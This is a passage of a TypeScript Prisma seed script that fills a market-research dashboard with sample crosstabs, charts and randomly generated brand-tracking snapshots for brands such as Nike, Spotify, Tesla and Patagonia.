        metrics: ['reach', 'time_spent', 'engagement', 'ad_receptivity', 'content_type', 'device_usage', 'multitasking_rate', 'attention_quality'],
        filters: { dayparts: ['early_morning', 'morning_commute', 'daytime', 'evening_prime', 'late_night'], media: ['tv', 'streaming', 'social', 'radio', 'podcast'] },
        results: {
          rows: [
            { daypart: 'Early Morning (5-8am)', tv: 22.5, streaming: 15.2, social: 42.5, radio: 28.5, podcast: 18.2 },
            { daypart: 'Morning Commute (8-10am)', tv: 8.5, streaming: 12.3, social: 55.2, radio: 42.5, podcast: 35.8 },
            { daypart: 'Daytime (10am-5pm)', tv: 15.2, streaming: 22.5, social: 48.5, radio: 32.5, podcast: 28.2 },
            { daypart: 'Evening Prime (7-10pm)', tv: 58.5, streaming: 72.3, social: 52.5, radio: 12.5, podcast: 22.5 },
            { daypart: 'Late Night (10pm+)', tv: 32.5, streaming: 55.8, social: 45.2, radio: 8.5, podcast: 15.2 }
          ],
          metadata: { sampleSize: 38000, metric: 'percentage_reach', confidence: 0.95 }
        },
        views: 892,
        createdBy: adminUser.id
      },
      {
        id: 'media-2',
        orgId: acmeCorp.id,
        name: 'Streaming Service Preferences by Age',
        description: 'Streaming service usage and satisfaction across age demographics',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 4).map(a => a.id),
        metrics: ['subscription_rate', 'monthly_hours', 'satisfaction', 'likelihood_to_churn', 'content_preference', 'ad_tolerance'],
        filters: { services: ['Netflix', 'Disney+', 'HBO Max', 'Amazon Prime', 'Hulu', 'Apple TV+'] },
        results: {
          rows: [
            { service: 'Netflix', age_18_24: 78.5, age_25_34: 82.3, age_35_44: 75.2, age_45_plus: 62.5 },
            { service: 'Disney+', age_18_24: 52.3, age_25_34: 68.5, age_35_44: 72.5, age_45_plus: 45.2 },
            { service: 'HBO Max', age_18_24: 42.5, age_25_34: 55.8, age_35_44: 48.2, age_45_plus: 38.5 },
            { service: 'Amazon Prime', age_18_24: 58.2, age_25_34: 72.5, age_35_44: 78.5, age_45_plus: 68.2 },
            { service: 'YouTube Premium', age_18_24: 35.2, age_25_34: 28.5, age_35_44: 18.5, age_45_plus: 12.3 }
          ],
          metadata: { sampleSize: 55000, metric: 'active_subscription_rate', confidence: 0.95 }
        },
        views: 654,
        createdBy: johnDoe.id
      },
      {
        id: 'media-3',
        orgId: acmeCorp.id,
        name: 'News Source Trust by Demographics',
        description: 'Trust levels in different news sources across demographic segments',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 5).map(a => a.id),
        metrics: ['trust_score', 'usage_frequency', 'credibility', 'recommendation_rate', 'political_lean_perception', 'ad_receptivity', 'subscription_intent'],
        filters: { sources: ['traditional_tv', 'newspapers', 'social_media', 'podcasts', 'online_news', 'local_news'] },
        results: {
          rows: [
            { source: 'Traditional TV News', gen_z: 32.5, millennials: 42.5, gen_x: 58.2, boomers: 72.5 },
            { source: 'Print Newspapers', gen_z: 18.5, millennials: 28.5, gen_x: 48.2, boomers: 68.5 },
            { source: 'Social Media News', gen_z: 42.5, millennials: 35.2, gen_x: 22.5, boomers: 15.2 },
            { source: 'Podcasts', gen_z: 48.5, millennials: 55.8, gen_x: 42.3, boomers: 28.5 },
            { source: 'Online News Sites', gen_z: 55.2, millennials: 62.5, gen_x: 58.2, boomers: 48.5 }
          ],
          metadata: { sampleSize: 42000, metric: 'trust_percentage', confidence: 0.95 }
        },
        views: 423,
        createdBy: janeSmith.id
      },

      // ============================================================================
      // DEMOGRAPHICS & SEGMENTATION (2 crosstabs)
      // ============================================================================
      {
        id: 'demo-1',
        orgId: acmeCorp.id,
        name: 'Sustainability Attitudes by Consumer Segment',
        description: 'Environmental attitudes and sustainable purchasing behavior across consumer segments',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 5).map(a => a.id),
        metrics: ['concern_level', 'purchase_impact', 'willingness_to_pay_more', 'brand_switching', 'greenwashing_skepticism', 'action_intent', 'category_relevance', 'information_seeking'],
        filters: { topics: ['climate_change', 'plastic_reduction', 'carbon_footprint', 'ethical_sourcing', 'circular_economy'] },
        results: {
          rows: [
            { attitude: 'Very Concerned', gen_z: 68.5, millennials: 58.2, gen_x: 45.5, boomers: 38.2, eco_conscious: 95.2 },
            { attitude: 'Pay Premium (10%+)', gen_z: 52.3, millennials: 48.5, gen_x: 35.2, boomers: 28.5, eco_conscious: 85.5 },
            { attitude: 'Switched Brands', gen_z: 62.5, millennials: 55.8, gen_x: 42.3, boomers: 32.5, eco_conscious: 88.2 },
            { attitude: 'Research Before Buy', gen_z: 72.5, millennials: 68.2, gen_x: 52.5, boomers: 42.3, eco_conscious: 92.5 },
            { attitude: 'Skeptical of Claims', gen_z: 58.5, millennials: 52.3, gen_x: 48.2, boomers: 55.8, eco_conscious: 75.2 }
          ],
          metadata: { sampleSize: 65000, confidence: 0.95, lastUpdated: now.toISOString() }
        },
        views: 1087,
        createdBy: adminUser.id
      },
      {
        id: 'demo-2',
        orgId: techStartup.id,
        name: 'Tech Adoption by Income Level',
        description: 'Technology adoption rates and attitudes across different income brackets',
        audiences: allAudiences.filter(a => a.orgId === techStartup.id).map(a => a.id),
        metrics: ['adoption_rate', 'spending', 'early_adopter_index', 'brand_preference', 'upgrade_frequency'],
        filters: { categories: ['smartphones', 'smart_home', 'wearables', 'ev_vehicles', 'ai_assistants'] },
        results: {
          rows: [
            { tech: 'Latest Smartphone', under_50k: 42.5, income_50_100k: 65.2, income_100_150k: 82.5, over_150k: 92.3 },
            { tech: 'Smart Home Devices', under_50k: 28.5, income_50_100k: 48.5, income_100_150k: 72.3, over_150k: 88.5 },
            { tech: 'Wearable Tech', under_50k: 22.3, income_50_100k: 42.5, income_100_150k: 62.5, over_150k: 78.2 },
            { tech: 'Electric Vehicle', under_50k: 5.2, income_50_100k: 12.5, income_100_150k: 28.5, over_150k: 52.3 },
            { tech: 'AI Assistants', under_50k: 35.2, income_50_100k: 52.3, income_100_150k: 68.5, over_150k: 82.5 }
          ],
          metadata: { sampleSize: 32000, metric: 'ownership_rate', confidence: 0.92 }
        },
        views: 345,
        createdBy: bobWilson.id
      },

      // ============================================================================
      // MARKET & GEOGRAPHIC ANALYSIS (2 crosstabs)
      // ============================================================================
      {
        id: 'market-1',
        orgId: acmeCorp.id,
        name: 'Global Market Digital Behavior Comparison',
        description: 'Digital behavior and platform usage patterns across global markets',
        audiences: allAudiences.filter(a => a.orgId === acmeCorp.id).slice(0, 8).map(a => a.id),
        metrics: ['internet_penetration', 'mobile_usage', 'social_media_adoption', 'ecommerce_share', 'digital_payments', 'streaming_adoption', 'gaming_engagement', 'digital_ad_spend'],
        filters: { markets: ['US', 'UK', 'Germany', 'France', 'Japan', 'China', 'Brazil', 'India'] },
        results: {
          rows: [
            { market: 'United States', internet: 92.5, mobile: 85.2, social: 72.5, ecommerce: 21.5 },
            { market: 'United Kingdom', internet: 95.2, mobile: 88.5, social: 78.2, ecommerce: 28.5 },
            { market: 'Germany', internet: 91.5, mobile: 82.3, social: 65.2, ecommerce: 18.5 },
            { market: 'Japan', internet: 93.8, mobile: 92.5, social: 72.5, ecommerce: 12.5 },
            { market: 'China', internet: 73.5, mobile: 98.2, social: 85.5, ecommerce: 52.3 },
            { market: 'Brazil', internet: 81.2, mobile: 92.5, social: 88.5, ecommerce: 15.2 },
            { market: 'India', internet: 52.5, mobile: 78.5, social: 45.2, ecommerce: 8.5 }
          ],
          metadata: { sampleSize: 185000, metric: 'percentage', confidence: 0.95, lastUpdated: now.toISOString() }
        },
        views: 2156,
        createdBy: adminUser.id
      },
      {
        id: 'market-2',
        orgId: enterpriseCo.id,
        name: 'US vs UK vs Germany Consumer Attitudes',
        description: 'Cross-market comparison of consumer attitudes, values, and purchase behaviors',
        audiences: [allAudiences.find(a => a.name === 'Enterprise Decision Makers')?.id].filter(Boolean) as string[],
        metrics: ['price_sensitivity', 'brand_loyalty', 'quality_focus', 'sustainability_priority', 'innovation_openness', 'privacy_concern', 'ad_receptivity', 'local_preference', 'online_trust', 'service_expectations'],
        filters: { markets: ['US', 'UK', 'Germany'], categories: ['all'] },
        results: {
          rows: [
            { attitude: 'Price Sensitivity', us: 65.2, uk: 72.5, germany: 78.5 },
            { attitude: 'Brand Loyalty', us: 52.3, uk: 58.2, germany: 68.5 },
            { attitude: 'Quality Focus', us: 72.5, uk: 75.8, germany: 88.2 },
            { attitude: 'Sustainability Priority', us: 55.2, uk: 62.5, germany: 78.5 },
            { attitude: 'Privacy Concern', us: 58.5, uk: 65.2, germany: 85.5 },
            { attitude: 'Local Brand Preference', us: 42.5, uk: 48.5, germany: 62.3 }
          ],
          metadata: { sampleSize: 45000, metric: 'importance_score', confidence: 0.95 }
        },
        views: 876,
        createdBy: sarahEnterprise.id
      }
    ]
  })

  // ==================== CHARTS ====================
  console.log('📈 Creating charts...')

  // Create charts with explicit IDs for reliable API access
  await prisma.chart.create({
    data: {
      id: '1',
      orgId: acmeCorp.id,
      name: 'Brand Health Trend Analysis',
      description: 'Weekly brand health scores over the past 12 months with trend analysis and predictions',
      type: 'LINE',
      config: {
        xAxis: { type: 'time', label: 'Date' },
        yAxis: { type: 'linear', label: 'Brand Health Score', min: 0, max: 100 },
        series: ['Nike', 'Adidas', 'Under Armour', 'Puma'],
        colors: ['#FF6B35', '#004E89', '#1A936F', '#F4D35E'],
        showLegend: true,
        showTrendline: true,
        annotations: [
          { date: '2024-06-15', label: 'Nike Campaign Launch', type: 'event' },
          { date: '2024-09-01', label: 'Holiday Season Start', type: 'period' }
        ]
      },
      data: {
        labels: Array.from({ length: 52 }, (_, i) => {
          const d = new Date(now.getTime() - (51 - i) * 7 * 24 * 60 * 60 * 1000)
          return d.toISOString().split('T')[0]
        }),
        datasets: [
          { label: 'Nike', data: Array.from({ length: 52 }, () => 75 + Math.random() * 15) },
          { label: 'Adidas', data: Array.from({ length: 52 }, () => 68 + Math.random() * 12) },
          { label: 'Under Armour', data: Array.from({ length: 52 }, () => 55 + Math.random() * 15) },
          { label: 'Puma', data: Array.from({ length: 52 }, () => 60 + Math.random() * 12) }
        ]
      },
      status: 'PUBLISHED',
      createdBy: adminUser.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '2',
      orgId: acmeCorp.id,
      name: 'Market Share Distribution',
      description: 'Current market share distribution across tracked brands in the sportswear category',
      type: 'PIE',
      config: {
        showLabels: true,
        showPercentages: true,
        innerRadius: 0,
        colors: ['#FF6B35', '#004E89', '#1A936F', '#F4D35E', '#88CCF1', '#D64045']
      },
      data: {
        labels: ['Nike', 'Adidas', 'Under Armour', 'Puma', 'New Balance', 'Others'],
        datasets: [{ data: [32.5, 22.8, 8.5, 12.2, 7.8, 16.2] }]
      },
      status: 'PUBLISHED',
      createdBy: johnDoe.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '3',
      orgId: acmeCorp.id,
      name: 'Audience Engagement Funnel',
      description: 'Conversion funnel from awareness to purchase across all audiences',
      type: 'FUNNEL',
      config: {
        stages: ['Awareness', 'Consideration', 'Preference', 'Intent', 'Purchase'],
        colors: ['#3B82F6', '#10B981', '#F59E0B', '#EF4444', '#8B5CF6'],
        showConversionRates: true,
        orientation: 'vertical'
      },
      data: {
        values: [100, 68.5, 45.2, 28.5, 18.2],
        conversions: [68.5, 66.0, 63.1, 63.9]
      },
      status: 'PUBLISHED',
      createdBy: janeSmith.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '4',
      orgId: acmeCorp.id,
      name: 'Competitive Radar Chart',
      description: 'Multi-dimensional competitive analysis across key brand metrics',
      type: 'RADAR',
      config: {
        dimensions: ['Awareness', 'Consideration', 'Preference', 'Loyalty', 'NPS', 'Sentiment'],
        maxValue: 100,
        showArea: true,
        opacity: 0.3
      },
      data: {
        labels: ['Awareness', 'Consideration', 'Preference', 'Loyalty', 'NPS', 'Sentiment'],
        datasets: [
          { label: 'Nike', data: [85, 72, 65, 78, 62, 75], color: '#FF6B35' },
          { label: 'Adidas', data: [78, 65, 58, 68, 52, 68], color: '#004E89' },
          { label: 'Puma', data: [68, 55, 48, 58, 45, 62], color: '#1A936F' }
        ]
      },
      status: 'PUBLISHED',
      createdBy: adminUser.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '5',
      orgId: acmeCorp.id,
      name: 'Sentiment Heatmap by Platform',
      description: 'Brand sentiment analysis across social media platforms and time',
      type: 'HEATMAP',
      config: {
        xAxis: { label: 'Platform' },
        yAxis: { label: 'Week' },
        colorScale: { min: -1, max: 1, colors: ['#EF4444', '#F59E0B', '#10B981'] },
        showValues: true
      },
      data: {
        xLabels: ['Twitter', 'Instagram', 'Facebook', 'TikTok', 'YouTube', 'LinkedIn'],
        yLabels: ['Week 1', 'Week 2', 'Week 3', 'Week 4'],
        values: [
          [0.65, 0.78, 0.52, 0.85, 0.72, 0.68],
          [0.58, 0.82, 0.48, 0.88, 0.75, 0.72],
          [0.72, 0.75, 0.55, 0.82, 0.78, 0.65],
          [0.68, 0.85, 0.58, 0.92, 0.82, 0.70]
        ]
      },
      status: 'PUBLISHED',
      createdBy: johnDoe.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '6',
      orgId: acmeCorp.id,
      name: 'Age Demographics Distribution',
      description: 'Audience distribution by age group with brand preference overlay',
      type: 'BAR',
      config: {
        orientation: 'vertical',
        stacked: false,
        grouped: true,
        showLabels: true,
        xAxis: { label: 'Age Group' },
        yAxis: { label: 'Percentage' }
      },
      data: {
        labels: ['18-24', '25-34', '35-44', '45-54', '55+'],
        datasets: [
          { label: 'Brand A Preference', data: [28.5, 35.2, 22.8, 18.5, 12.2], color: '#3B82F6' },
          { label: 'Brand B Preference', data: [22.3, 28.5, 32.5, 25.8, 18.5], color: '#10B981' }
        ]
      },
      status: 'PUBLISHED',
      createdBy: janeSmith.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '7',
      orgId: acmeCorp.id,
      name: 'NPS Score Trend',
      description: 'Net Promoter Score trend over time with industry benchmark',
      type: 'AREA',
      config: {
        xAxis: { type: 'time', label: 'Month' },
        yAxis: { label: 'NPS Score', min: -100, max: 100 },
        fill: true,
        showBenchmark: true,
        benchmarkValue: 45,
        gradient: true
      },
      data: {
        labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
        datasets: [
          { label: 'NPS', data: [52, 48, 55, 58, 52, 62, 65, 58, 68, 72, 68, 75], color: '#3B82F6' }
        ],
        benchmark: { label: 'Industry Average', value: 45 }
      },
      status: 'PUBLISHED',
      createdBy: adminUser.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '8',
      orgId: acmeCorp.id,
      name: 'Interest Category Treemap',
      description: 'Audience interest categories sized by engagement level',
      type: 'TREEMAP',
      config: {
        colorScale: 'category',
        showLabels: true,
        showValues: true,
        groupBy: 'category'
      },
      data: {
        children: [
          { name: 'Technology', value: 42500, children: [
            { name: 'AI & ML', value: 15000 },
            { name: 'Mobile', value: 12500 },
            { name: 'Gaming', value: 15000 }
          ]},
          { name: 'Lifestyle', value: 38000, children: [
            { name: 'Fitness', value: 18000 },
            { name: 'Travel', value: 12000 },
            { name: 'Food', value: 8000 }
          ]},
          { name: 'Entertainment', value: 35000, children: [
            { name: 'Streaming', value: 20000 },
            { name: 'Music', value: 10000 },
            { name: 'Sports', value: 5000 }
          ]}
        ]
      },
      status: 'PUBLISHED',
      createdBy: johnDoe.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '9',
      orgId: techStartup.id,
      name: 'User Growth Trajectory',
      description: 'Monthly active users growth with cohort retention overlay',
      type: 'LINE',
      config: {
        xAxis: { type: 'time', label: 'Month' },
        yAxis: { label: 'Users (thousands)', type: 'linear' },
        showArea: true,
        showDataPoints: true,
        smoothing: 0.3
      },
      data: {
        labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
        datasets: [
          { label: 'MAU', data: [125, 142, 168, 195, 228, 265, 312, 358, 415, 478, 542, 628], color: '#8B5CF6' },
          { label: 'DAU', data: [45, 52, 62, 75, 88, 102, 125, 145, 168, 195, 225, 262], color: '#10B981' }
        ]
      },
      status: 'PUBLISHED',
      createdBy: bobWilson.id
    }
  })

  await prisma.chart.create({
    data: {
      id: '10',
      orgId: enterpriseCo.id,
      name: 'Revenue by Region',
      description: 'Quarterly revenue breakdown by geographic region',
      type: 'DONUT',
      config: {
        innerRadius: 60,
        showLabels: true,
        showPercentages: true,
        legend: { position: 'right' }
      },
      data: {
        labels: ['North America', 'Europe', 'Asia Pacific', 'Latin America', 'Middle East & Africa'],
        datasets: [{ data: [42.5, 28.2, 18.5, 6.8, 4.0] }]
      },
      status: 'PUBLISHED',
      createdBy: sarahEnterprise.id
    }
  })

  // ==================== BRAND TRACKING ====================
  console.log('🎯 Creating brand tracking data...')

  // Helper function to generate realistic brand metrics with progression
  function generateBrandMetricsForDate(
    baseAwareness: number,
    baseHealth: number,
    baseNps: number,
    dayIndex: number,
    _totalDays: number,
    trend: 'up' | 'down' | 'stable'
  ) {
    // Add realistic progression based on trend
    const trendMultiplier = trend === 'up' ? 1.003 : trend === 'down' ? 0.997 : 1
    const progressFactor = Math.pow(trendMultiplier, dayIndex)

    // Add natural variance
    const variance = () => (Math.random() - 0.5) * 4

    const awareness = Math.min(95, Math.max(20, baseAwareness * progressFactor + variance()))
    const consideration = awareness * (0.55 + Math.random() * 0.15) + variance()
    const preference = consideration * (0.6 + Math.random() * 0.15) + variance()
    const loyalty = preference * (0.65 + Math.random() * 0.15) + variance()

    return {
      brandHealth: Math.min(100, Math.max(40, baseHealth * progressFactor + variance())),
      awareness,
      consideration,
      preference,
      loyalty,
      nps: Math.min(80, Math.max(-10, baseNps * progressFactor + variance() * 3)),
      marketShare: 15 + Math.random() * 20 + (dayIndex * (trend === 'up' ? 0.1 : trend === 'down' ? -0.05 : 0)),
      sentimentScore: 0.3 + Math.random() * 0.5,
    }
  }

  // Nike Brand Tracking - Strong, upward trend
  const nikeBrandTracking = await prisma.brandTracking.create({
    data: {
      id: '1',
      orgId: acmeCorp.id,
      brandName: 'Nike',
      description: 'Global leader in athletic footwear and apparel. Tracking brand health, awareness, and competitive positioning across key demographics.',
      industry: 'Sportswear & Athletic Apparel',
      competitors: ['Adidas', 'Under Armour', 'Puma', 'New Balance', 'Reebok'],
      audiences: ['Gen Z Athletes', 'Millennials', 'Fitness Enthusiasts', 'Sneaker Culture'],
      status: BrandTrackingStatus.ACTIVE,
      schedule: '0 6 * * *',
      metrics: {
        brandAwareness: true,
        consideration: true,
        preference: true,
        loyalty: true,
        nps: true,
        sentimentAnalysis: true
      },
      alertThresholds: {
        brandHealth: { min: 70, max: 100 },
        nps: { min: 40, max: 100 }
      },
      createdBy: adminUser.id,
      snapshotCount: 52,
      lastSnapshot: new Date(now.getTime() - 2 * 60 * 60 * 1000),
    }
  })

  // Create 52 weeks of historical data for Nike (weekly snapshots)
  const nikeSnapshots = []
  for (let week = 51; week >= 0; week--) {
    const snapshotDate = new Date(now.getTime() - week * 7 * 24 * 60 * 60 * 1000)
    const metrics = generateBrandMetricsForDate(78, 82, 58, 51 - week, 52, 'up')

    nikeSnapshots.push({
      brandTrackingId: nikeBrandTracking.id,
      orgId: acmeCorp.id,
      snapshotDate,
      metrics,
      brandHealth: metrics.brandHealth,
      awareness: metrics.awareness,
      consideration: metrics.consideration,
      preference: metrics.preference,
      loyalty: metrics.loyalty,
      nps: metrics.nps,
      marketShare: metrics.marketShare,
      sentimentScore: metrics.sentimentScore,
      competitorData: {
        'Adidas': { awareness: 72 + Math.random() * 5, consideration: 45 + Math.random() * 8, marketShare: 18 + Math.random() * 4, sentiment: 0.65 + Math.random() * 0.15 },
        'Under Armour': { awareness: 58 + Math.random() * 8, consideration: 32 + Math.random() * 6, marketShare: 8 + Math.random() * 3, sentiment: 0.55 + Math.random() * 0.2 },
        'Puma': { awareness: 62 + Math.random() * 6, consideration: 35 + Math.random() * 7, marketShare: 10 + Math.random() * 3, sentiment: 0.6 + Math.random() * 0.15 },
        'New Balance': { awareness: 55 + Math.random() * 8, consideration: 38 + Math.random() * 6, marketShare: 7 + Math.random() * 3, sentiment: 0.7 + Math.random() * 0.1 },
        'Reebok': { awareness: 48 + Math.random() * 8, consideration: 25 + Math.random() * 5, marketShare: 5 + Math.random() * 2, sentiment: 0.5 + Math.random() * 0.2 },
      },
      audienceBreakdown: {
        '18-24': { awareness: metrics.awareness * 1.15, preference: metrics.preference * 1.2, nps: metrics.nps * 1.1 },
        '25-34': { awareness: metrics.awareness * 1.1, preference: metrics.preference * 1.1, nps: metrics.nps * 1.05 },
        '35-44': { awareness: metrics.awareness, preference: metrics.preference * 0.95, nps: metrics.nps },
        '45-54': { awareness: metrics.awareness * 0.9, preference: metrics.preference * 0.85, nps: metrics.nps * 0.95 },
        '55+': { awareness: metrics.awareness * 0.8, preference: metrics.preference * 0.7, nps: metrics.nps * 0.9 },
      },
      insights: week === 0 ? [
        'Brand awareness increased 12% year-over-year, driven by successful athlete partnerships',
        'Gen Z engagement outpacing other demographics by 23% - TikTok campaigns showing strong ROI',
        'NPS score reached all-time high of 62 following sustainability initiative launch',
        'Market share gains primarily coming from Under Armour and Reebok customer acquisition',
        'Recommendation: Double down on digital-first marketing to maintain Gen Z momentum'
      ] : [],
    })
  }
  await prisma.brandTrackingSnapshot.createMany({ data: nikeSnapshots })

  // Spotify Brand Tracking - Tech/Entertainment, stable with seasonal bumps
  const spotifyBrandTracking = await prisma.brandTracking.create({
    data: {
      id: '2',
      orgId: acmeCorp.id,
      brandName: 'Spotify',
      description: 'Leading music streaming platform. Monitoring brand perception, user engagement metrics, and competitive landscape against Apple Music and YouTube Music.',
      industry: 'Music Streaming & Entertainment',
      competitors: ['Apple Music', 'YouTube Music', 'Amazon Music', 'Tidal', 'Deezer'],
      audiences: ['Music Enthusiasts', 'Podcast Listeners', 'Premium Subscribers', 'Gen Z'],
      status: BrandTrackingStatus.ACTIVE,
      schedule: '0 8 * * 1',
      metrics: {
        brandAwareness: true,
        consideration: true,
        preference: true,
        loyalty: true,
        nps: true,
        sentimentAnalysis: true
      },
      alertThresholds: {
        brandHealth: { min: 65, max: 100 },
        nps: { min: 35, max: 100 }
      },
      createdBy: johnDoe.id,
      snapshotCount: 45,
      lastSnapshot: new Date(now.getTime() - 5 * 60 * 60 * 1000),
    }
  })

  const spotifySnapshots = []
  for (let week = 44; week >= 0; week--) {
    const snapshotDate = new Date(now.getTime() - week * 7 * 24 * 60 * 60 * 1000)
    const metrics = generateBrandMetricsForDate(85, 78, 52, 44 - week, 45, 'up')

    spotifySnapshots.push({
      brandTrackingId: spotifyBrandTracking.id,
      orgId: acmeCorp.id,
      snapshotDate,
      metrics,
      brandHealth: metrics.brandHealth,
      awareness: metrics.awareness,
      consideration: metrics.consideration,
      preference: metrics.preference,
      loyalty: metrics.loyalty,
      nps: metrics.nps,
      marketShare: metrics.marketShare,
      sentimentScore: metrics.sentimentScore,
      competitorData: {
        'Apple Music': { awareness: 80 + Math.random() * 5, consideration: 55 + Math.random() * 8, marketShare: 22 + Math.random() * 4, sentiment: 0.7 + Math.random() * 0.1 },
        'YouTube Music': { awareness: 75 + Math.random() * 8, consideration: 48 + Math.random() * 8, marketShare: 18 + Math.random() * 4, sentiment: 0.6 + Math.random() * 0.15 },
        'Amazon Music': { awareness: 65 + Math.random() * 8, consideration: 35 + Math.random() * 6, marketShare: 12 + Math.random() * 3, sentiment: 0.55 + Math.random() * 0.2 },
        'Tidal': { awareness: 35 + Math.random() * 8, consideration: 18 + Math.random() * 5, marketShare: 3 + Math.random() * 2, sentiment: 0.65 + Math.random() * 0.15 },
        'Deezer': { awareness: 25 + Math.random() * 6, consideration: 12 + Math.random() * 4, marketShare: 2 + Math.random() * 1, sentiment: 0.5 + Math.random() * 0.2 },
      },
      audienceBreakdown: {
        '18-24': { awareness: metrics.awareness * 1.12, preference: metrics.preference * 1.25, nps: metrics.nps * 1.15 },
        '25-34': { awareness: metrics.awareness * 1.08, preference: metrics.preference * 1.15, nps: metrics.nps * 1.1 },
        '35-44': { awareness: metrics.awareness * 0.98, preference: metrics.preference * 0.9, nps: metrics.nps * 0.95 },
        '45-54': { awareness: metrics.awareness * 0.85, preference: metrics.preference * 0.75, nps: metrics.nps * 0.85 },
        '55+': { awareness: metrics.awareness * 0.7, preference: metrics.preference * 0.55, nps: metrics.nps * 0.75 },
      },
      insights: week === 0 ? [
        'Spotify Wrapped campaign generated 340% increase in social mentions year-over-year',
        'Podcast exclusive content driving 18% lift in premium subscription conversions',
        'Apple Music closing awareness gap in 25-34 demographic - recommend targeted campaigns',
        'AI-powered DJ feature receiving exceptionally positive sentiment (0.89 score)',
        'Recommendation: Invest in audiobook expansion to capture growing segment'
      ] : [],
    })
  }
  await prisma.brandTrackingSnapshot.createMany({ data: spotifySnapshots })

  // Tesla Brand Tracking - Innovative but volatile sentiment
  const teslaBrandTracking = await prisma.brandTracking.create({
    data: {
      id: '3',
      orgId: acmeCorp.id,
      brandName: 'Tesla',
      description: 'Electric vehicle pioneer and clean energy company. Tracking brand perception, purchase intent, and sentiment across EV market segments.',
      industry: 'Electric Vehicles & Clean Energy',
      competitors: ['Ford', 'Rivian', 'Lucid Motors', 'BMW', 'Mercedes-Benz EQ'],
      audiences: ['EV Enthusiasts', 'Tech Early Adopters', 'Eco-Conscious Consumers', 'Luxury Auto Buyers'],
      status: BrandTrackingStatus.ACTIVE,
      schedule: '0 7 * * *',
      metrics: {
        brandAwareness: true,
        consideration: true,
        preference: true,
        loyalty: true,
        nps: true,
        sentimentAnalysis: true
      },
      alertThresholds: {
        brandHealth: { min: 60, max: 100 },
        sentimentScore: { min: 0.3, max: 1 }
      },
      createdBy: adminUser.id,
      snapshotCount: 78,
      lastSnapshot: new Date(now.getTime() - 4 * 60 * 60 * 1000),
    }
  })

  const teslaSnapshots = []
  for (let week = 77; week >= 0; week--) {
    const snapshotDate = new Date(now.getTime() - week * 7 * 24 * 60 * 60 * 1000)
    const metrics = generateBrandMetricsForDate(88, 74, 48, 77 - week, 78, 'stable')
    // Tesla has more sentiment volatility
    metrics.sentimentScore = 0.4 + Math.random() * 0.4

    teslaSnapshots.push({
      brandTrackingId: teslaBrandTracking.id,
      orgId: acmeCorp.id,
      snapshotDate,
      metrics,
      brandHealth: metrics.brandHealth,
      awareness: metrics.awareness,
      consideration: metrics.consideration,
      preference: metrics.preference,
      loyalty: metrics.loyalty,
      nps: metrics.nps,
      marketShare: 28 + Math.random() * 8,
      sentimentScore: metrics.sentimentScore,
      competitorData: {
        'Ford': { awareness: 75 + Math.random() * 5, consideration: 42 + Math.random() * 8, marketShare: 15 + Math.random() * 4, sentiment: 0.6 + Math.random() * 0.15 },
        'Rivian': { awareness: 45 + Math.random() * 10, consideration: 28 + Math.random() * 8, marketShare: 6 + Math.random() * 3, sentiment: 0.72 + Math.random() * 0.12 },
        'Lucid Motors': { awareness: 35 + Math.random() * 8, consideration: 22 + Math.random() * 6, marketShare: 3 + Math.random() * 2, sentiment: 0.68 + Math.random() * 0.15 },
        'BMW': { awareness: 82 + Math.random() * 5, consideration: 38 + Math.random() * 6, marketShare: 12 + Math.random() * 3, sentiment: 0.7 + Math.random() * 0.1 },
        'Mercedes-Benz EQ': { awareness: 78 + Math.random() * 5, consideration: 35 + Math.random() * 5, marketShare: 10 + Math.random() * 3, sentiment: 0.72 + Math.random() * 0.1 },
      },
      audienceBreakdown: {
        '18-24': { awareness: metrics.awareness * 1.1, preference: metrics.preference * 0.95, nps: metrics.nps * 1.05 },
        '25-34': { awareness: metrics.awareness * 1.15, preference: metrics.preference * 1.2, nps: metrics.nps * 1.1 },
        '35-44': { awareness: metrics.awareness * 1.08, preference: metrics.preference * 1.15, nps: metrics.nps * 1.05 },
        '45-54': { awareness: metrics.awareness * 0.95, preference: metrics.preference * 1.1, nps: metrics.nps * 0.95 },
        '55+': { awareness: metrics.awareness * 0.85, preference: metrics.preference * 0.8, nps: metrics.nps * 0.85 },
      },
      insights: week === 0 ? [
        'Brand awareness remains industry-leading at 91% among EV-considerers',
        'Sentiment volatility detected - recommend monitoring social media more closely',
        'Cybertruck launch generated 2.3M social mentions with mixed sentiment (0.58)',
        'Rivian gaining consideration among eco-conscious segment - watch competitor closely',
        'Recommendation: Focus messaging on reliability and service network expansion'
      ] : [],
    })
  }
  await prisma.brandTrackingSnapshot.createMany({ data: teslaSnapshots })

  // Patagonia Brand Tracking - Strong sustainability brand, upward trend
  const patagoniaBrandTracking = await prisma.brandTracking.create({
    data: {
      id: '4',
      orgId: acmeCorp.id,
      brandName: 'Patagonia',
      description: 'Outdoor apparel company with strong sustainability positioning. Tracking brand perception among eco-conscious consumers and outdoor enthusiasts.',
      industry: 'Outdoor Apparel & Sustainability',
      competitors: ['The North Face', 'REI', 'Arc\'teryx', 'Columbia', 'Cotopaxi'],
      audiences: ['Outdoor Enthusiasts', 'Eco-Conscious Millennials', 'Premium Apparel Buyers', 'Adventure Travelers'],
      status: BrandTrackingStatus.ACTIVE,
      schedule: '0 9 * * 1',
      metrics: {
        brandAwareness: true,
        consideration: true,
        preference: true,
        loyalty: true,
        nps: true,
        sentimentAnalysis: true
      },
      alertThresholds: {
        brandHealth: { min: 75, max: 100 },
        nps: { min: 50, max: 100 }
      },
      createdBy: janeSmith.id,
      snapshotCount: 36,
      lastSnapshot: new Date(now.getTime() - 8 * 60 * 60 * 1000),
    }
  })

  const patagoniaSnapshots = []
  for (let week = 35; week >= 0; week--) {
    const snapshotDate = new Date(now.getTime() - week * 7 * 24 * 60 * 60 * 1000)
